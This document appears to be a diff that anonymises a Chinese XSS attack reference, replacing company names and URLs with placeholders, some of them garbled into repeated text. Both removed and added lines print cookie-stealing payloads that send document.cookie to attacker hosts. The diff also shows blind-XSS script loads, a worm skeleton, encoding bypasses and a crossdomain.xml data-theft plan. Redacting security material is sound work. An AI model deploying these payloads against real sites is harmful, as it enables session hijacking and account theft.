@@ -36,13 +36,13 @@ XSS的本质是**信任边界的突破**：
 | 输出点类型 | 触发条件 | 典型场景 | 案例来源 |
 |-----------|---------|---------|---------|
 | 用户昵称/签名 | 页面加载 | 个人主页、评论区、好友列表 | 大街网、游卡、YY客户端 |
-| 搜索框回显 | 搜索操作 | 搜索结果页、历史记录 | 开心网、百度贴吧 |
-| 评论/留言 | 内容展示 | 论坛、博客、商品评价 | 汽车之家、苏宁、网易 |
-| 文件名/描述 | 文件列表 | 网盘、相册、附件管理 | 百度100G网盘 |
-| 邮件正文/标题 | 打开邮件 | 邮箱系统 | Coremail、189邮箱、eYou |
-| URL参数回显 | 页面渲染 | 分享链接、跳转页面 | 腾讯风铃、新浪微博 |
+| 搜索框回显 | 搜索操作 | 搜索结果页、历史记录 | 开心网、某搜索引擎贴吧 |
+| 评论/留言 | 内容展示 | 论坛、博客、商品评价 | 汽车之家、苏宁、某互联网公司 |
+| 文件名/描述 | 文件列表 | 网盘、相册、附件管理 | 某搜索引擎100G网盘 |
+| 邮件正文/标题 | 打开邮件 | 邮箱系统 | Coremail、某邮箱服务、eYou |
+| URL参数回显 | 页面渲染 | 分享链接、跳转页面 | 某互联网公司风铃、某社交平台某社交平台 |
 | 图片alt/src | 图片加载 | 富文本编辑器 | 苏宁论坛 |
-| Flash参数 | SWF加载 | 视频播放器、音乐播放器 | 新浪微博、音悦台 |
+| Flash参数 | SWF加载 | 视频播放器、音乐播放器 | 某社交平台某社交平台、音悦台 |
 | 订单备注/附言 | 后台查看 | 电商后台、工单系统 | xpshop、时代商城 |
 | API回调参数 | JS执行 | JSONP、回调函数 | 音悦台Flash |
 
@@ -64,7 +64,7 @@ XSS的本质是**信任边界的突破**：
    - 桌面应用设置 -> Web管理后台
 
 4. **二次渲染点**
-   - 草稿箱标题列表（百度经验案例）
+   - 草稿箱标题列表（某搜索引擎经验案例）
    - 审核列表（ZCMS案例）
    - 管理后台统计页
 
@@ -123,7 +123,7 @@ callback('{{OUTPUT}}');
 </script><script>alert(1)</script>
 ```
 
-**实战案例（新浪微博）**：
+**实战案例（某社交平台某社交平台）**：
 ```javascript
 // 原始代码
 backurl=http://...?url=aaaaaaaa',a:(alert(1))//
@@ -197,7 +197,7 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
 ```
 
-**实战案例（新浪汽车论坛）**：
+**实战案例（某社交平台汽车论坛）**：
 ```html
 <!-- 直接插入被拦截 -->
 <script>alert(document.cookie)</script>
@@ -218,7 +218,7 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 \u003ciframe\u002fonload\u003dalert(1)\u003e
 
 // 实战案例（联想论坛Flash XSS）
-http://1.com\u0022\u003e\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u002f\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e/1.swf
+https://example.com/[已脱敏]
 ```
 
 #### 4.1.3 Base64编码
@@ -416,7 +416,7 @@ element.action
 
 ### 5.3 DOM XSS案例分析
 
-**案例1：document.domain设置不当（腾讯）**
+**案例1：document.domain设置不当（某互联网公司）**
 
 ```javascript
 // 漏洞代码
@@ -424,18 +424,18 @@ var g_sDomain = QSFL.excore.getURLParam("domain");
 document.domain = g_sDomain;
 
 // 利用方式（Webkit浏览器）
-http://imgcache.qq.com/xxx/popup.html?domain=com
+https://example.com/[已脱敏]
 // 可设置document.domain为"com"，突破同源策略
 ```
 
-**案例2：Flash htmlText注入（新浪微博）**
+**案例2：Flash htmlText注入（某社交平台某社交平台）**
 
 ```actionscript
 // Flash中的htmlText支持<img>标签加载SWF
 this.txt_songName.htmlText = param1.songName;
 
 // 利用方式
-// 歌曲名设置为: <img src="http://evil.com/xss.swf">
+// 歌曲名设置为: <img src="https://example.com/[已脱敏]">
 // Flash会加载并执行恶意SWF
 ```
 
@@ -468,17 +468,17 @@ navigateToURL(new URLRequest("javascript:alert(1)"));
 
 ### 6.2 crossdomain.xml利用
 
-**实战案例（QQ邮箱）**：
+**实战案例（某互联网公司邮箱）**：
 ```xml
 <cross-domain-policy>
-    <allow-access-from domain="*.qq.com"/>
+    <allow-access-from domain="*.某互联网公司.com"/>
 </cross-domain-policy>
 ```
 
 利用思路：
-1. 在*.qq.com下找到可上传点（图片伪装SWF）
+1. 在*.某互联网公司.com下找到可上传点（图片伪装SWF）
 2. 上传恶意SWF
-3. 通过Flash读取qq邮箱数据
+3. 通过Flash读取某互联网公司邮箱数据
 
 ### 6.3 Flash XSS Rootkit
 
@@ -518,13 +518,13 @@ navigateToURL(new URLRequest("javascript:alert(1)"));
 
 ```html
 <!-- 基础窃取 -->
-<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
+<script>new Image().src="https://example.com/[已脱敏]"+document.cookie</script>
 
 <!-- 使用fetch -->
-<script>fetch('http://attacker.com/?c='+document.cookie)</script>
+<script>fetch('https://example.com/[已脱敏]'+document.cookie)</script>
 
 <!-- 通过img发送 -->
-<img src=x onerror="new Image().src='http://attacker.com/?c='+document.cookie">
+<img src=x onerror="new Image().src='https://example.com/[已脱敏]'+document.cookie">
 ```
 
 ### 7.3 外部JS加载Payload
@@ -564,7 +564,7 @@ navigateToURL(new URLRequest("javascript:alert(1)"));
 **大街网蠕虫代码结构**：
 ```javascript
 function worm(){
-    jQuery.post("http://target.com/post.do", {
+    jQuery.post("https://example.com/[已脱敏]", {
         "content": "<payload_with_self_propagation>",
         // ... other params
     })
@@ -661,7 +661,7 @@ worm()
 
 **盲打Payload示例**：
 ```html
-<script src=http://xss.com/probe.js></script>
+<script src=https://example.com/[已脱敏]
 ```
 
 **成功案例**：
@@ -696,10 +696,10 @@ worm()
 
 ### 9.4 XSS -> 账号劫持 -> 权限提升
 
-**案例（腾讯空间蠕虫）**：
+**案例（某互联网公司空间蠕虫）**：
 ```
 XSS触发 -> 获取skey -> 伪造Cookie ->
-自动发微博 -> 自动加关注 -> 蠕虫传播
+自动发某社交平台 -> 自动加关注 -> 蠕虫传播
 ```
 
 ---
@@ -734,11 +734,11 @@ XSS触发 -> 获取skey -> 伪造Cookie ->
 |---------|---------|-----------|
 | 存储型XSS | 赶集网、汽车之家、大街网 | 用户输入存储、多点触发 |
 | 反射型XSS | 开心网、交通银行、搜狐 | URL参数回显 |
-| DOM XSS | 腾讯document.domain、新浪Flash | 客户端代码执行 |
-| Flash XSS | 音悦台Rootkit、QQ邮箱crossdomain | SWF安全配置 |
-| mXSS | 新浪邮箱、189邮箱 | 浏览器解析差异 |
+| DOM XSS | 某互联网公司document.domain、某社交平台Flash | 客户端代码执行 |
+| Flash XSS | 音悦台Rootkit、某互联网公司邮箱crossdomain | SWF安全配置 |
+| mXSS | 某社交平台邮箱、某邮箱服务 | 浏览器解析差异 |
 | 盲打XSS | 成都公安、苏宁、快速问医生 | 后台触发 |
-| 蠕虫XSS | 大街网、腾讯空间 | 自动传播 |
+| 蠕虫XSS | 大街网、某互联网公司空间 | 自动传播 |
 
 ---
 
